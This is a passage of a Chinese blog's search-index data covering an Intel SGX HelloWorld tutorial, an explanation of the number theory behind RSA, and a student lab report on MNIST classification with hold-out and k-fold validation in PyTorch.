&lt;StackMaxSize&gt;0x40000&lt;/StackMaxSize&gt; &lt;HeapMaxSize&gt;0x100000&lt;/HeapMaxSize&gt; &lt;TCSNum&gt;10&lt;/TCSNum&gt; &lt;TCSPolicy&gt;1&lt;/TCSPolicy&gt; &lt;!-- Recommend changing &#x27;DisableDebug&#x27; to 1 to make the enclave undebuggable for enclave release --&gt; &lt;DisableDebug&gt;0&lt;/DisableDebug&gt; &lt;MiscSelect&gt;0&lt;/MiscSelect&gt; &lt;MiscMask&gt;0xFFFFFFFF&lt;/MiscMask&gt;&lt;/EnclaveConfiguration&gt;tcs_num 10, tcs_max_num 10, tcs_min_pool 1The required memory is 3960832B.The required memory is 0x3c7000, 3868 KB.Succeed.SIGN =&gt; enclave.signed.soThe project has been built in debug hardware mode.$ ./appHello worldInfo: SampleEnclave successfully returned.Enter a character before exit ... 编译流程(Makefile) 通过 sgx_edger8r 工具在 App/ 目录下生成不可信代码(Enclave_u.c 和 Enclave_u.h)，这部分生成代码主要会调用 ECALL (sgx_ecall)； 编译不可信部分 Binary: app； 通过sgx_edger8r 工具在 Enclave/ 目录下生成可信代码(Enclave_t.c 和 Enclave_t.h)； 编译可信动态链接库(enclave.so)； 通过sgx_sing工具签名可信动态链接库(enclave.signed.so)； 结束。 编译后目录结构 123456789101112131415161718192021222324HelloWorld├── app├── App│ ├── App.cpp│ ├── App.h│ ├── App.o #[generated]│ ├── Enclave_u.c #[generated] │ ├── Enclave_u.h #[generated] │ └── Enclave_u.o #[generated]├── Enclave│ ├── Enclave.config.xml│ ├── Enclave.cpp│ ├── Enclave.edl│ ├── Enclave.h│ ├── Enclave.lds│ ├── Enclave.o #[generated]│ ├── Enclave_private.pem│ ├── Enclave_t.c #[generated]│ ├── Enclave_t.h #[generated]│ └── Enclave_t.o #[generated]├── enclave.signed.so #[generated]├── enclave.so #[generated]├── Include└── Makefile HelloWorld 大概流程如下 1.添加可信函数Encalve&#x2F;Enclave.edl 12345enclave &#123; trusted &#123; public void ecall_hello_from_enclave([out, size=len] char* buf, size_t len); &#125;;&#125;; 2.在可信区域定义可信函数Enclave&#x2F;Enclave.cpp 1234567891011121314151617#include &quot;Enclave.h&quot;#include &quot;Enclave_t.h&quot; /* print_string */#include &lt;string.h&gt;void ecall_hello_from_enclave(char *buf, size_t len)&#123; const char *hello = &quot;Hello world&quot;; size_t size = len; if(strlen(hello) &lt; len) &#123; size = strlen(hello) + 1; &#125; memcpy(buf, hello, size - 1); buf[size-1] = &#x27;\\0&#x27;;&#125; 3.调用可信函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;# include &lt;unistd.h&gt;# include &lt;pwd.h&gt;# define MAX_PATH FILENAME_MAX#include &quot;sgx_urts.h&quot;#include &quot;App.h&quot;#include &quot;Enclave_u.h&quot;/* Global EID shared by multiple threads */sgx_enclave_id_t global_eid = 0;int initialize_enclave(void)&#123; sgx_status_t ret = SGX_ERROR_UNEXPECTED; /* 调用 sgx_create_enclave 创建一个 Enclave 实例 */ /* Debug Support: set 2nd parameter to 1 */ ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &amp;global_eid, NULL); if (ret != SGX_SUCCESS) &#123; printf(&quot;Failed to create enclave, ret code: %d\\n&quot;, ret); return -1; &#125; return 0;&#125;/* 应用程序入口 */int SGX_CDECL main(int argc, char *argv[])&#123; (void)(argc); (void)(argv); const size_t max_buf_len = 100; char buffer[max_buf_len] = &#123;0&#125;; /* 创建并初始化 Enclave */ if(initialize_enclave() &lt; 0)&#123; printf(&quot;Enter a character before exit ...\\n&quot;); getchar(); return -1; &#125;//-------------------------添加代码区域------------------------------------ /* ECALL 调用 */ ecall_hello_from_enclave(global_eid, buffer, max_buf_len); printf(&quot;%s\\n&quot;, buffer);//------------------------------------------------------------------------ /* 销毁 Enclave */ sgx_destroy_enclave(global_eid); printf(&quot;Info: SampleEnclave successfully returned.\\n&quot;); printf(&quot;Enter a character before exit ...\\n&quot;); getchar(); return 0;&#125; 总结即便最简单的 SGX HelloWold 也比较复杂，当然“安全性”和“成本”（技术壁垒门槛、开发成本、维护成本、物料成本等）总是成正比的，和“效率”成反比的。希望这篇文章对那些想入门开发 SGX 应用的用户有所帮助。","categories":[{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/categories/SGX/"}],"tags":[{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/tags/SGX/"},{"name":"Linux","slug":"Linux","permalink":"https://snowman12137.github.io/tags/Linux/"}],"author":"Sn0wma1n"},{"title":"RSA数学原理解析","slug":"RSA数学原理解析","date":"2023-05-15T03:18:16.000Z","updated":"2023-09-02T14:32:10.629Z","comments":true,"path":"2023/05/15/RSA数学原理解析/","link":"","permalink":"https://snowman12137.github.io/2023/05/15/RSA%E6%95%B0%E5%AD%A6%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/","excerpt":"","text":"1.引言 RSA算法(RSA algorithm)是一种非对称加密算法, 广泛应用在互联网和电子商务中. 它使用一对密钥进行加密和解密, 分别称为公钥(public key)和私钥(private key). 使用公钥加密的内容只能用私钥解密, 使用私钥加密的内容只能用公钥解密, 并且不能通过公钥在可行的时间内计算出私钥. 这使得加密通信不需要交换私钥, 保证了通信的安全. 那么它是怎么做到这一点的呢? 背后有哪些数学原理? 这篇文章我们来讨论这个问题. 本文会先介绍RSA算法中用到的数论概念和定理: 模算术, 最大公约数与贝祖定理, 线性同余方程, 中国余数定理, 费马小定理; 然后再介绍RSA算法的原理, 并证明其是有效的. 本文会假设你了解数论的基本概念, 如素数, 最大公约数, 互素等 2.模算术2.1整数除法用一个正整数去除一个整数，可以得到一个商和一个余数，数学符号定义为： 定理1：令 a 为整数, d 为正整数, 则存在唯一的整数 q 和 r, 满足 $0\\leq r&lt;d$, 使得 $a&#x3D;dq+r$ 当r&#x3D;0时，我们称 d 整除 a, 记作$d|a$; 否则称 d 不整除 a, 记作 $d\\nmid a$，整除有以下基本性质: 定理2：令a,b,c,为整数，其中$a\\neq0$,则：如果$a|b$且$a|c$则$a|(a+b)$ 2.2模算术在数论中我们特别关心一个整数被一个正整数除时的余数. 我们用 $a\\bmod m&#x3D;b$ 表示整数 a 除以正整数 m 的余数是 b. 为了表示两个整数被一个正整数除时的余数相同, 人们又提出了同余式(congruence). 定义1:如果 a 和 b 是整数而 m 是正整数, 则当 m 整除 a - b 时称 a 模 m 同余 b. 记作 $a\\equiv b(\\bmod m)$ $a\\equiv b(\\bmod m)$ 和 $a\\bmod m&#x3D;b$很相似. 事实上, 如果 $a\\bmod m&#x3D;b$, 则 $a\\equiv b(\\bmod m)$. 但他们本质上是两个不同的概念.$a\\bmod m&#x3D;b$ 表达的是一个函数, 而 $a\\equiv b(\\bmod m)$ 表达的是两个整数之间的关系. 另外，同余式$a\\equiv b(\\bmod m)$还可以表示为$m|(b-a)$，同时符合上式的式子可以转化为同余式 模算术的性质： 定理3：如果m是正整数，a,b是整数，则有$$\\begin{aligned}(a+b)\\bmod m &amp;&#x3D;((a\\bmod m)+(b\\bmod m))\\bmod m\\ab\\bmod m &amp;&#x3D;(a\\bmod m)(b\\bmod m)\\bmod m\\end{aligned}$$根据定理3，可得一下推论 推论1：设m是正整数，a,b,c是整数；如果$a\\equiv b(\\bmod m)$则$ac\\equiv bc(\\bmod m)$ 证明： $\\because a\\equiv b(\\bmod m)$ $\\therefore m|(b-a)$ 所以右端再乘以任何整数m都可以整除 即$m|(b-a)c$ 同理，既然$m|(b-a)$且$c|c$ 也可以推出$mc|(b-a)c$ 结论：若$a\\equiv b(\\bmod m)$，则$ac\\equiv bc(\\bmod m)$且$ac\\equiv bc(\\bmod mc)$同时成立 推论2设 m 是正整数, a, b 是整数, c 是不能被 m 整除的整数; 如果 $ac\\equiv bc(\\bmod m)$, 则$a\\equiv b(\\bmod m)$,依据推论1的证明，也是显而易见的。 3.最大公约数如果一个整数 d 能够整除另一个整数 a, 则称 d 是 a 的一个约数(divisor); 如果 d 既能整除 a 又能整除 b, 则称 d 是 a 和 b 的一个公约数(common divisor). 能整除两个整数的最大整数称为这两个整数的最大公约数(greatest common divisor). 定义2：令a和b是不全为0的两个整数，能使$d|a$和$d|b$的最大整数d成为a和b的最大公约数，记作$gcd(a,b)$ 3.1 求最大公约数如何求两个已知整数的最大公约数呢? 这里我们讨论一个高效的求最大公约数的算法, 称为辗转相除法. 因为这个算法是欧几里得发明的, 所以也称为欧几里得算法. 辗转相除法基于以下定理: 引理 1 令 $a&#x3D;bq+r$, 其中 a, b, q 和 r 均为整数. 则有$gcd(a,b)&#x3D;gcd(b,r)$ 证明：我们假设 d 是 a 和 b 的公约数, 即 $d|a$且 $d|b$, 那么根据定理2, d 也能整除 $a-bq&#x3D;r$. 所以 a 和 b 的任何公约数也是 b 和 r 的公约数; 类似地, 假设 d 是 b 和 r 的公约数, 即 $d|b$且 $d|r$, 那么根据定理2, d 也能整除 $a&#x3D;bq+r$.. 所以 b 和 r 的任何公约数也是 a 和 b 的公约数; 因此, a 与 b 和 b 与 r 拥有相同的公约数. 所以 $gcd(a,b)&#x3D;gcd(b,r)$ 辗转相除法就是利用引理1, 把大数转换成小数. 例如, 求 $gcd(287,91)$, 我们就把用较大的数除以较小的数. 首先用 287 除以 91, 得$$287&#x3D;91\\cdot3+14$$我们有$gcd(287,91)&#x3D;gcd(91,14)$,问题转化成求$gcd(91,14)$,同样的，用91除以14得$$91&#x3D;14\\cdot6+7$$有$gcd(91,14)&#x3D;gcd(14,7)$,用14除以7得$$14&#x3D;7\\cdot2+0$$所以$gcd(297,91)&#x3D;gcd(91,14)&#x3D;gcd(14,7)&#x3D;7$ 代码是这样的(两个都可以) 12345678910def gcd(a,b): while b!=0 : r = a%b a = b b = r return adef gcd_new(a,b): if b==0: return a return gcd_new(b,a%b) 3.2 贝祖定理现在我们讨论最大公约数的一个重要性质: 定理 4 贝祖定理 如果整数 a, b 不全为零, 则 $gcd(a,b)$是 a 和 b 的线性组合集$ax+by|x,y\\in Z$ 中最小的元素. 这里的 x 和 y 被称为贝祖系数 证明 令 $A&#x3D;ax+by|x,y\\in Z$ 设存在 $x_0$ ,$y_0$ 使 $d_0$ 是 A 中的最小正元素, $d_0&#x3D;ax_0+by_0$; 现在用 $d_0$去除 a, 这就得到唯一的整数 q(商) 和 r(余数) 满足$$\\begin{aligned}d_0q+r &amp;&#x3D; a \\qquad 0\\leq r&lt;d_0\\(ax_0+by_0)q+r&amp;&#x3D;a\\r&amp;&#x3D;a-aqx_0-bqy_0\\r&amp;&#x3D;a(1-qx_0)+b(-qy_0)\\in A\\end{aligned}$$又$0\\leq r &lt;d_0$,$d_0$是A中最小的正元素 $\\therefore r&#x3D;0,d|a$ 同理, 用 $d_0$去除 b, 可得 $d_0|b$. 所以说 $d_0$ 是 a 和 b 的公约数. 设 a 和 b 的最大公约数是 d, 那么$d|(ax_0+by_0)$即 $d|d_0$ $\\therefore d_0$是a和b的最大公约数 我们可以对辗转相除法稍作修改, 让它在计算出最大公约数的同时计算出贝祖系数. 1234def gcd_new_2(a,b): if b==0: return a,1,0 d,x,y = gcd_new_2(b,a%b) return d,y,x-(int(a/b))*y 大家是否还记得辗转相除法：我们换一个步骤多一点的例子$gcd(963,657)$$$\\begin{aligned}963&amp;&#x3D;1\\cdot657+306 \\qquad\\qquad&amp;9&amp;&#x3D;7\\cdot657-15\\cdot(963-657)&#x3D;22\\cdot657-15\\cdot963 \\657&amp;&#x3D;2\\cdot306+45 &amp;9&amp;&#x3D;7\\cdot(657-2\\cdot306)-306&#x3D;7\\cdot657-15\\cdot963 \\306&amp;&#x3D;6\\cdot45+36 &amp;9&amp;&#x3D;45-(306-6\\cdot45)&#x3D;7\\cdot45-306\\45 &amp;&#x3D;1\\cdot36+9 &amp;9&amp;&#x3D;45-36\\36 &amp;&#x3D;4\\cdot9\\end{aligned}$$ $gcd(963,657)&#x3D;9&#x3D;22\\cdot657-15\\cdot963,x_0&#x3D;-15,y_0&#x3D;22$就是二元一次方程$963x+657y&#x3D;9$的一组解且是$963x+657y$方程的正整数中的最小解。 4.线性同余方程现在我们来讨论求解形如 $ax\\equiv b(\\bmod m)$ 的线性同余方程. 求解这样的线性同余方程是数论研究及其应用中的一项基本任务. 如何求解这样的方程呢? 我们要介绍的一个方法是通过求使得方程 $\\overline{a}a\\equiv 1(\\bmod m)$ 成立的整数 $\\overline{a}$. 我们称 $\\overline{a}$为 a 模 m 的逆. 下面的定理指出, 当 a 和 m 互素时, a 模 m 的逆必然存在. 定理5：如果 a 和 m 为互素的整数且 $m&gt;1$, 则 a 模 m 的逆存在, 并且是唯一的. 证明 由贝祖定理可知, $\\because gcd(a,m)&#x3D;1$ , ∴ 存在整数 x 和 y 使得$$ax+my&#x3D;1$$这蕴含着$$ax+my\\equiv 1(\\bmod m)\\\\because my\\equiv0(\\bmod m)，所以有\\ax\\equiv 1(\\bmod m)\\\\therefore x为a模的逆$$这样我们就可以调用辗转相除法 gcd(a, m) 求得 a 模 m 的逆. 求得了 a 模 m 的逆 �¯, 现在我们可以来解线性同余方程了. 具体的做法是这样的: 对于方程$ax\\equiv b( \\bmod m)$同时乘以$\\overline{a}$得,$$\\overline{a}ax\\equiv \\overline{a}b(\\bmod m)$$$把\\overline{a}a\\equiv 1(\\bmod m )代入上式，得\\$$$x\\equiv \\overline{a}b(\\bmod m)$$ $x\\equiv \\overline{a}b(\\bmod m)$就是方程的解，注意同余方程会有无数个W整数解, 所以我们用同余式来表示同余方程的解. 例1:求$34x\\equiv 77(\\bmod 89)$ 解调用$gcd(34,89)$,得$gcd(34,89)&#x3D;1&#x3D;1389-3434$,所以34模89的逆为-34，方程两边同时乘 -34 得$$\\begin{aligned}-34\\cdot34x&amp;\\equiv-34\\cdot77(\\bmod89)\\x&amp;\\equiv-34\\cdot77(\\bmod89)\\x&amp;\\equiv-2618\\equiv52(\\bmod89)\\end{aligned}$$ 5.中国剩余定理中国南北朝时期数学著作 孙子算经 中提出了这样一个问题: 有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？ 用现代的数学语言表述就是: 下列同余方程组的解释多少?$$\\begin{cases}x\\equiv2(\\bmod3)\\x\\equiv3(\\bmod5)\\x\\equiv2(\\bmod7)\\\\end{cases}$$孙子算经 中首次提到了同余方程组问题及其具体解法. 因此中国剩余定理称为孙子定理. 定理 6 中国余数定理 令 $m_1,m_2,…..,m_n$为大于 1 且两两互素的正整数, $a_1,a_2,….a_n$ 是任意整数. 则同余方程组$$\\begin{cases}x\\equiv a_1(\\bmod m_1)\\x\\equiv a_2(\\bmod m_2)\\…..\\x\\equiv a_n(\\bmod m_n)\\\\end{cases}$$有唯一的模$m&#x3D;m_1m_2….m_n$的解 证明：我们使用构造证明法, 构造出这个方程组的解. 首先对于 $i&#x3D;1,2,….,n$, 令$$M_i&#x3D;\\frac{m}{m_i}$$ 即,$M_i$ 是除了$m_i$ 之外所有模数的积.$\\because m_1,m_2….m_n$两两互素, $\\therefore gcd(m_i,M_i)&#x3D;1$ 由定理5 可知, 存在整数 $y_i$ 是 $M_i$模$m_i$的逆. 即$$M_iy_i\\equiv1(\\bmod m_i)$$同时乘以$a_i$得$$a_iM_iy_i\\equiv a_i(\\bmod m_i)$$就是第 i 个方程的一个解; 那么怎么构造出方程组的解呢? 我们注意到, 根据 $M_i$ 的定义可得, 对所有的 $j\\neq i$, 都有 $a_iM_iy_i\\equiv0(\\bmod m_j)$. 因此我们令$$x&#x3D;a_1M_1y_1+a_2M_2y_2+….+a_nM_ny_n&#x3D;\\sum_{i&#x3D;1}^{n}{a_iM_iy_i}$$有了这个结论, 我们可以解答 孙子算经 中的问题了: 对方程组的每个方程, 求出 $M_i$ , 然后调用 gcd(M_i, m_i) 求出 $y_i$:$$\\begin{cases}\\begin{aligned}&amp;x\\equiv2(\\bmod3)\\quad &amp;M_1&amp;&#x3D;35\\quad y_1&#x3D;-1\\&amp;x\\equiv3(\\bmod5)\\quad &amp;M_2&amp;&#x3D;21\\quad y_2&#x3D;1\\&amp;x\\equiv2(\\bmod7)\\quad &amp;M_3&amp;&#x3D;15\\quad y_3&#x3D;-1\\\\end{aligned}\\end{cases}$$最后求出$x&#x3D;-235+321+2*15&#x3D;23\\equiv23(\\bmod 105)$ 6.费马小定理现在我们来看数论中另外一个重要的定理, 费马小定理(Fermat’s little theorem) 定理7费马小定理：如果a是一个整数，p是一个素数，那么$$a^p\\equiv a(\\bmod p)$$特别的当a不是p的倍数时（即$gcd(a,p)&#x3D;1$），有$$a^{p-1}\\equiv1(\\bmod p)\\$$ 7欧拉函数再来看一看欧拉函数的知识。对于正整数n，欧拉函数$\\varphi(n)$是小于或等于n的正整数中与n互质的数的数目 如$\\varphi(8)&#x3D;4$，1,3,5,7均与8互质 定理8：n,m为整数,$(n,m)&#x3D;1$，如果$a_1,a_2,….a_n$和$b_1,b_2,….b_n$分别是模n,m的一个完整系，则有形如$nb_i+ma_j(1\\leq i\\leq s,1\\leq j\\leq t)$的数构成模mn的一个完整缩系，特别地有$\\varphi(nm)&#x3D;\\varphi(n)\\varphi(m)$ 定理9：当n$\\geq2$时，设$n&#x3D;p_1^{e_1}….p_s^{e_s}$是n的标准分解式，则$$\\varphi(n)&#x3D;\\prod_{l&#x3D;1}^{s}(p_l^{e_l}-p_l^{e_l-1})&#x3D;n\\prod_{l&#x3D;1}^{s}(1-\\frac{1}{p})$$证明：当$(n.m)&#x3D;1$时$$\\varphi(n,m)&#x3D;\\varphi(n)\\varphi(m)$$当$n_1,n_2……n_s$两两互素时$$\\varphi(\\prod_{l&#x3D;1}^{s}n_l)&#x3D;\\prod_{l&#x3D;1}^{s}n_l$$因此$$\\varphi(n)&#x3D;\\prod_{l&#x3D;1}^{s}\\varphi(p_l^{e_l})$$问题转化成如何求$\\varphi(p_l^{e_l})$,其中$p_l$要么$p_l|a$,要么$(p_l,a)&#x3D;1$。在1,2….$p_l$当中可以被$p_l$整除的整数共有$\\frac{p_l^{e_l}}{p_l}&#x3D;p_l^{e_l-1}$个，故其中与$p_l^{e_l}$互素的个数共有$p_l^{e_l}-p_l^{e_l-1}$个，于是$$\\varphi(p_l^{e_l})&#x3D;p_l^{e_l}-p_l^{e_l-1}$$这样一来$$\\varphi(n)&#x3D;\\prod_{l&#x3D;1}^{s}(p_l^{e_l}-p_l^{e_l-1})&#x3D;\\prod_{l&#x3D;1}^{s}p_l^{e_l}(1-\\frac{1}{p_l})&#x3D;n\\prod_{l&#x3D;1}^{s}(1-\\frac{1}{p})$$其中若p为素数，则$$\\varphi(p)&#x3D;p-1&#x3D;p(1-\\frac{1}{p})$$ 8.RSA算法我们终于可以来看 RSA 算法了. 先来看 RSA 算法是怎么运作的: RSA 算法按照以下过程创建公钥和私钥: 1.随机算取两个大素数p和q，$p\\neq q$ 2.计算$n&#x3D;pq$ 3.选取一个与$(p-1)(q-1)$互素的小整数e 4.求e模$(p-1)(q-1)$的逆，记作d，即$de\\equiv 1\\bmod(p-1)(q-1)$ 5.将$P&#x3D;(e,n)$公开，是公钥。 6.将$S&#x3D;(d,n)$保密，作为私钥 想 要把明文$M $加密成密文$C$,计算$$C&#x3D;M^e\\bmod n$$要把密文解密成明文$C$$M $,计算$$M&#x3D;C^d \\bmod n$$ 下面证明RSA算法是有效的： 证明：要证明其有效性，只需要证明$C\\equiv M^e\\bmod n$也就是$M^{ed}\\equiv M(\\bmod n)$,注意到d为e模$(p-1)(1-1)$的逆，所以有$$ed\\equiv 1(\\bmod(p-1)(q-1))$$ 。","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://snowman12137.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"现代密码学","slug":"现代密码学","permalink":"https://snowman12137.github.io/tags/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"author":"Sn0wma1n"},{"title":"大三网络安全人工智能实验报告","slug":"大三网络安全人工智能实验报告","date":"2023-05-04T12:09:16.000Z","updated":"2024-02-03T17:05:00.554Z","comments":true,"path":"2023/05/04/大三网络安全人工智能实验报告/","link":"","permalink":"https://snowman12137.github.io/2023/05/04/%E5%A4%A7%E4%B8%89%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/","excerpt":"","text":"《人工智能》课程实验报告网络与信息安全学院班 级： 20180XX 姓 名： XXX 学 号： 20009XXXX 提交时间： 2023. 4. 20 基于神经网络的MNIST手写数字识别一、实验目的 掌握运用神经网络模型解决有监督学习问题 掌握机器学习中常用的模型训练测试方法 了解不同训练方法的选择对测试结果的影响 二、实验内容MNIST数据集​ 本实验采用的数据集MNIST是一个手写数字图片数据集，共包含图像和对应的标签。数据集中所有图片都是28x28像素大小，且所有的图像都经过了适当的处理使得数字位于图片的中心位置。MNIST数据集使用二进制方式存储。图片数据中每个图片为一个长度为784（28x28x1，即长宽28像素的单通道灰度图）的一维向量，而标签数据中每个标签均为长度为10的一维向量。 分层采样方法​ 分层采样（或分层抽样，也叫类型抽样）方法，是将总体样本分成多个类别，再分别在每个类别中进行采样的方法。通过划分类别，采样出的样本的类型分布和总体样本相似，并且更具有代表性。在本实验中，MNIST数据集为手写数字集，有0~9共10种数字，进行分层采样时先将数据集按数字分为10类，再按同样的方式分别进行采样。 神经网络模型评估方法​ 通常，我们可以通过实验测试来对神经网络模型的误差进行评估。为此，需要使用一个测试集来测试模型对新样本的判别能力，然后以此测试集上的测试误差作为误差的近似值。两种常见的划分训练集和测试集的方法： ​ 留出法（hold-out）直接将数据集按比例划分为两个互斥的集合。划分时为尽可能保持数据分布的一致性，可以采用分层采样（stratified sampling）的方式，使得训练集和测试集中的类别比例尽可能相似。需要注意的是，测试集在整个数据集上的分布如果不够均匀还可能引入额外的偏差，所以单次使用留出法得到的估计结果往往不够稳定可靠。在使用留出法时，一般要采用若干次随机划分、重复进行实验评估后取平均值作为留出法的评估结果。 ​ k折交叉验证法（k-fold cross validation）先将数据集划分为k个大小相似的互斥子集，每个子集都尽可能保持数据分布的一致性，即也采用分层采样（stratified sampling）的方法。然后，每次用k-1个子集的并集作为训练集，余下的那个子集作为测试集，这样就可以获得k组训练集和测试集，从而可以进行k次训练和测试。最终返回的是这k个测试结果的均值。显然，k折交叉验证法的评估结果的稳定性和保真性在很大程度上取决于k的取值。k最常用的取值是10，此外常用的取值还有5、20等。 三、实验方法设计 实验环境 1.VSCODE 2.anaconda&#x3D;&#x3D;4.14.0 3.python&#x3D;&#x3D;3.7 4.TensorFlow–gpu&#x3D;&#x3D;1.15.0 5.Keras&#x3D;&#x3D;2.3.1 6.实验报告编辑器：typora 介绍实验中程序的总体设计方案、关键步骤的编程方法及思路，主要包括: 因为之前用过pytorch进行机器学习的训练和学习，所以本作业使用pytorch进行建模和训练。 标准训练流程如下：导入包-&gt;设定初始值-&gt;加载数据集（预处理）-&gt;建立模型-&gt;训练-&gt;测试-&gt;评估 其中需要对加载数据集进行处理，把留出法的比例进行调整来观察结果。 其次要使用k折交叉验证法进行对比测试。 为了表明k折交叉验证法与留出法的效果对比，我建立了连个模型，一个是按照标准流程建立的优秀的模型。一个是用作对比k折交叉验证法与留出法效果对比的劣质模型。 含有tensorflow部分代码，在四、4中。 设置初始值 123456&gt;mean = [0.5]&gt;std = [0.5]&gt;# batch size&gt;BATCH_SIZE =128&gt;Iterations = 1 # epoch&gt;learning_rate = 0.01 优化器与损失函数 12&gt;criterion = torch.nn.CrossEntropyLoss() &gt;optimizer = torch.optim.SGD(model.parameters(),learning_rate) 训练代码 12345678910111213&gt;def train(model, optimizer,criterion,epoch): model.train() # setting up for training for batch_idx, (data, target) in enumerate(train_loader): # data contains the image and target contains the label = 0/1/2/3/4/5/6/7/8/9 data = data.view(-1, 28*28).requires_grad_() optimizer.zero_grad() # setting gradient to zero output = model(data) # forward loss = criterion(output, target) # loss computation loss.backward() # back propagation here pytorch will take care of it optimizer.step() # updating the weight values if batch_idx % 100 == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) 测试代码 1234567891011121314151617181920212223&gt;def test(model, criterion, val_loader, epoch,train= False): model.eval() test_loss = 0 correct = 0 with torch.no_grad(): for batch_idx, (data, target) in enumerate(val_loader): data = data.view(-1, 28*28).requires_grad_() output = model(data) test_loss += criterion(output, target).item() # sum up batch loss pred = output.max(1, keepdim=True)[1] # get the index of the max log-probability correct += pred.eq(target.view_as(pred)).sum().item() # if pred == target then correct +=1 test_loss /= len(val_loader.dataset) # average test loss if train == False: print(&#x27;\\nTest set: Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.4f&#125;%)\\n&#x27;.format( test_loss, correct, val_loader.sampler.__len__(), 100. * correct / val_loader.sampler.__len__() )) if train == True: print(&#x27;\\nTrain set: Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.4f&#125;%)\\n&#x27;.format( test_loss, correct, val_loader.sampler.__len__(), 100. * correct / val_loader.sampler.__len__() )) return 100. * correct / val_loader.sampler.__len__() 1）模型构建的程序设计（伪代码或源代码截图）及说明解释 （10分）训练模型 12345678910111213141516class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv = nn.Conv2d(1, 32, 3) self.dropout = nn.Dropout2d(0.25) self.fc = nn.Linear(5408, 10) def forward(self, x): x = self.conv(x) x = F.relu(x) x = F.max_pool2d(x, 2) x = self.dropout(x) x = torch.flatten(x, 1) x = self.fc(x) output = F.log_softmax(x, dim=1) return output 我用了一层conv和一层pool来获取cherng图片的特征。之后把这些特征减小为10个层，所以用flatten把特征集中成vector后，再用一个全连接层连接到输出层。 使用留出法原始的训练比例，两个Epoch，得到的结果很好。达到97%。 为了对比留出法及K折验证法建立的简陋模型 1model = nn.Sequential(nn.Flatten(), nn.Linear(784, 256), nn.ReLU(),nn.Linear(256, 10)) 可以看到这个简陋模型得到的结果很差，准确率只有83%，用于之后的K折校验法的对比组。预处理和上述相同，Epoch只有一组。 2）模型迭代训练的程序设计（伪代码或源代码截图）及说明解释 （10分）123456789101112131415def train(model, optimizer,criterion,epoch): model.train() # setting up for training for batch_idx, (data, target) in enumerate(train_loader): data = data.view(-1, 28*28).requires_grad_() optimizer.zero_grad() # setting gradient to zero output = model(data) # forward loss = criterion(output, target) # loss computation loss.backward() # back propagation here pytorch will take care of it optimizer.step() # updating the weight values if batch_idx % 100 == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) 先注意到因為 training 和 testing 時 model 會有不同行為，所以用 model.train() 把 model 調成 training 模式。 接著 iterate 過 batch_idx，每個 batch_idx會 train 過整個 training set。每個 dataset 會做 batch training。 接下來就是重點了。基本的步驟：zero_grad、model(data)、取 loss、back propagation 算 gradient、最後 update parameter。前面都介紹過了，還不熟的可以往前翻。 3）模型训练过程中周期性测试的程序设计（伪代码或源代码截图）及说明解释（周期性测试指的是每训练n个step就对模型进行一次测试，得到准确率和loss值）（10分） 我选用了每100步进行一个打印的频率，打印训练进度和Loss值，最后打印平均损失值和准确率。 4）分层采样的程序设计（伪代码或源代码截图）及说明解释 （10分）12345678910111213141516171819train_transform = transforms.Compose([ transforms.ToTensor(), transforms.Normalize(mean, std) ]) test_transform = transforms.Compose([ transforms.ToTensor(), transforms.Normalize(mean, std) ]) train_loader = torch.utils.data.DataLoader( datasets.MNIST(&#x27;./mnist&#x27;, train=True, download=True, transform=train_transform), batch_size=BATCH_SIZE, shuffle=True) # train dataset test_loader = torch.utils.data.DataLoader( datasets.MNIST(&#x27;./mnist&#x27;, train=False, transform=test_transform), batch_size=BATCH_SIZE, shuffle=False) # test dataset 123456789&gt;def hold_out(images, labels, train_percentage): test_acc = torch.zeros([Iterations]) train_acc = torch.zeros([Iterations]) ## training the logistic model for i in range(Iterations): train(model, optimizer,criterion,i) train_acc[i] = test(model, criterion, train_loader, i,train=True) #Testing the the current CNN test_acc[i] = test(model, criterion, test_loader, i) torch.save(model,&#x27;perceptron.pt&#x27;) 使用了系统自带的minist数据分类器。 5）k折交叉验证法的程序设计（伪代码或源代码截图）及说明解释 （10分） mnist数据集的训练集和测试集的合并 123456789train_init = datasets.MNIST(&#x27;./mnist&#x27;, train=True, transform=train_transform) test_init = datasets.MNIST(&#x27;./mnist&#x27;, train=False, transform=test_transform) # the dataset for k fold cross validation dataFold = torch.utils.data.ConcatDataset([train_init, test_init]) 使用Sklearn中的KFold进行数据集划分，并且转换回pytorch类型的Dataloader 123456789kf = KFold(n_splits=k_split_value,shuffle=True, random_state=0) # init KFold for train_index , test_index in kf.split(dataFold): # split # get train, val 根据索引划分 train_fold = torch.utils.data.dataset.Subset(dataFold, train_index) test_fold = torch.utils.data.dataset.Subset(dataFold, test_index) train_loader = torch.utils.data.DataLoader(dataset=train_fold, batch_size=BATCH_SIZE, shuffle=True) test_loader = torch.utils.data.DataLoader(dataset=test_fold, batch_size=BATCH_SIZE, shuffle=True) 完整的代码 1234567891011121314151617181920212223242526def train_flod_Mnist(k_split_value): different_k_mse = [] kf = KFold(n_splits=k_split_value,shuffle=True, random_state=0) # init KFold for train_index , test_index in 